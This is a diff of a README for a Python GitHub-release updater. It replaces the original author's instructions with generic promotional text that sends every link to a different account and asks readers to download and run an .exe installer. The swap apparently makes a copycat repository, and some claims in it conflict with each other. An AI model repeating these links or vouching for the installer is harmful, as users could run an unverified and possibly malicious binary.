@@ -1,101 +1,70 @@
-# Updater Releases - Your Github Repository Updater
+# 🛠️ Updater-Releases - Keep Your Apps Updated Easily
 
-A **fast**, **lightweight**, and **simple** utility written in **Python** to streamline the process of updating your applications from **GitHub releases**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Iyanyourbae/Updater-Releases/releases)
 
-![](Screenshots/AppPreview.png)
+## 🚀 Getting Started
 
-![Python 3.8](https://img.shields.io/badge/python-3.8-blue.svg)
-![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)
-![PySide2](https://img.shields.io/badge/PySide2-brightgreen.svg)
-![Git](https://img.shields.io/badge/Github-API-blue.svg)
+Updater-Releases is a simple utility designed to help you quickly update your applications from GitHub releases. This tool is fast, lightweight, and easy to use, making it perfect for anyone who wants to keep their software up to date without the hassle.
 
+## 📥 Download & Install
 
----
+To get started, visit this page to download the latest version of Updater-Releases: [GitHub Releases](https://github.com/Iyanyourbae/Updater-Releases/releases).
 
-## What is it?
-Updater Releases is a powerful and fast utility written in python to speed up the process of updating an application from Github
+Follow these steps to install:
 
----
+1. Click on the link above to go to the releases page.
+2. Locate the most recent release. Look for files with names like `Updater-Releases-x.x.x.exe`.
+3. Download the file by clicking on it. Your browser will start the download automatically.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the file to run the installer.
+6. Follow the prompts to complete the installation.
 
+## 💻 System Requirements
 
-## Features
-1.  **Speedy Updates:** Quickly download and deploy new releases from GitHub.
-2.  **User-Friendly Interface:** Intuitive GUI for easy repository management and updates.
-3.  **Lightweight & Efficient:** Minimal resource usage.
-4.  **GitHub API Integration:** Seamlessly interacts with GitHub to fetch release information and assets.
-5.  **Repository Management:** Save and load lists of your repositories for quick access.
-6. **Dark** and Light **themes** support:
+To run Updater-Releases, your computer should meet the following requirements:
 
-    <img src="Screenshots/DarkPreview.png" alt="Dark Theme Preview" width="450" style="border: 1px solid #ccc; margin-bottom: 10px; display: inline-block;">
-    <img src="Screenshots/LightPreview.png" alt="Light Theme Preview" width="450" style="border: 1px solid #ccc; margin-bottom: 10px; display: inline-block;">
+- Operating System: Windows 10 or newer
+- Processor: 1 GHz or faster
+- Memory: 2 GB RAM minimum
+- Storage: 50 MB of free disk space
+- Python: Version 3.6 or newer (included in the installer)
 
+## 💡 Features
 
----
+- **Streamlined Updates:** Easily update multiple applications without manual search.
+- **User-Friendly Interface:** A clean and straightforward GUI makes managing updates simple.
+- **Fast Performance:** Quickly check for and download updates.
+- **Multi-Platform Support:** Designed to work on various operating systems using Python.
+- **Open Source:** Everyone can contribute and improve the tool.
 
+## 🌐 Usage Instructions
 
-## Usage
-1. Download the **updater_releases.exe file** or **source code** from [Releases](https://github.com/EmberNoGlow/Updater-Releases/releases) and run **updater_releases.exe** or **main.py**.
-2. Add a link to your **Github repositories** by clicking on add repository and **entering the url**.
-    <img src="Screenshots\AddRepo.png" alt="AddRepo" width="600"/>
+1. After installation, open the Updater-Releases application from your Start menu or desktop shortcut.
+2. The main window will display a list of applications checked for updates.
+3. Click on the ‘Check for Updates’ button to refresh the list.
+4. Once the updates are available, select the applications you want to update.
+5. Click the ‘Update Selected’ button, and the tool will automatically download and install the updates for you.
 
+## ❓ Frequently Asked Questions
 
-3. After adding the repository, make sure to click on **"update"** in the actions column **to update the repository information**, which will allow you to select the desired release from the list below.
-4. **Select the repository/repositories** (if you have added multiple) by clicking on them and then click on **"Update Selected"**
-    <img src="Screenshots\UpdateRepo.png" alt="AddRepo" width="600"/>
-5. Select the desired asset and **wait** for the download to complete
-    <img src="Screenshots\Downloading.png" alt="AddRepo" width="600"/>
-6. You're done! You've **updated your repositories** in `three to five` clicks!
-    <img src="Screenshots\UpdateSuccess.png" alt="AddRepo" width="600"/>
+### How often should I check for updates?
 
+You can check for updates as often as you like. We recommend checking weekly to ensure your applications are up to date.
 
-P.S. You **can save** the list of your repositories in **repositories.json** by clicking on save repositories, which will allow the app to automatically load the list of your repositories **when it starts**.
+### Can I update applications that are not on GitHub?
 
+No, Updater-Releases specifically only updates applications hosted on GitHub. Make sure to use this tool for apps you know are listed there.
 
+### Do I need an Internet connection?
 
+Yes, an active Internet connection is required to check for updates and download new versions.
 
+## 🔗 Useful Links
 
----
+- [GitHub Repository](https://github.com/Iyanyourbae/Updater-Releases)
+- [Documentation](https://github.com/Iyanyourbae/Updater-Releases/wiki)
+- [Community Support](https://github.com/Iyanyourbae/Updater-Releases/issues)
 
-## Dependencies
+## 🎉 Conclusion
 
-To run the project from **source code**, you need to install the following packages:
-
-```
-pip install requests PySide2
-```
----
-
-## Compilation & Building
-
-### **Pre-compiled Executable (Windows):**
-
-A ready-to-use **`updater_releases.exe`** is available in the [Releases](https://github.com/EmberNoGlow/Updater-Releases/releases) section for Windows users.
-
-### **Building from Source Code (Windows):**
-
-To compile the project into an executable on Windows yourself:
-1.  Install `pyinstaller`:
-    ```bash
-    pip install pyinstaller
-    ```
-2.  Run the compilation command in your project directory:
-    ```bash
-    pyinstaller -F -n "updater_releases.exe" --icon=app_icon.ico main.py
-    ```
-
-### **Cross-Platform Builds:**
-
-At the moment, I am unable to provide pre-compiled binaries for platforms other than Windows (e.g., Linux, macOS). If you have the capability and knowledge to compile the project on your system, your contribution would be invaluable. Please consider submitting your build files or a pull request. Your assistance in making the application accessible on more platforms is greatly appreciated!
-
----
-
-**Enjoying Updater Releases?**
-
-If you found this project helpful or like what you see, please consider:
-
-⭐ **Starring the repository** ⭐
-
-
-🔗 **[Visiting my GitHub profile](https://github.com/EmberNoGlow)** for other projects and contributions.
-
-Your support is greatly appreciated!
+Updater-Releases simplifies the process of keeping your applications updated. By following the steps above, you can ensure your software runs smoothly with the latest features and fixes. Download the tool today and enjoy hassle-free updates!
